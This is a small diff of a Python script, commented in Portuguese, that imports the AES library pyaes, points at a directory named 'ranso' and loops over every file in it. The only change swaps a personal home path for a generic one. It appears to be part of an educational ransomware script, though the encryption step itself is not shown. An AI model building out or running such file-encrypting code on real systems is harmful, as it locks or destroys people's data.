@@ -3,7 +3,7 @@ import os
 import pyaes
 
 
-directory = '/home/saiph/ranso/'                 # Escolhemos o Diretório.
+directory = '/home/diretorio/ranso/'                 # Escolhemos o Diretório.
 list = os.listdir(directory)                     # Usaremos o "os.listdir()" para listar todos os arquivos do diretório.
 
 for files in os.listdir(directory):              # Usando uma estrutura de repetição For para pegar todos os arquivos listados.
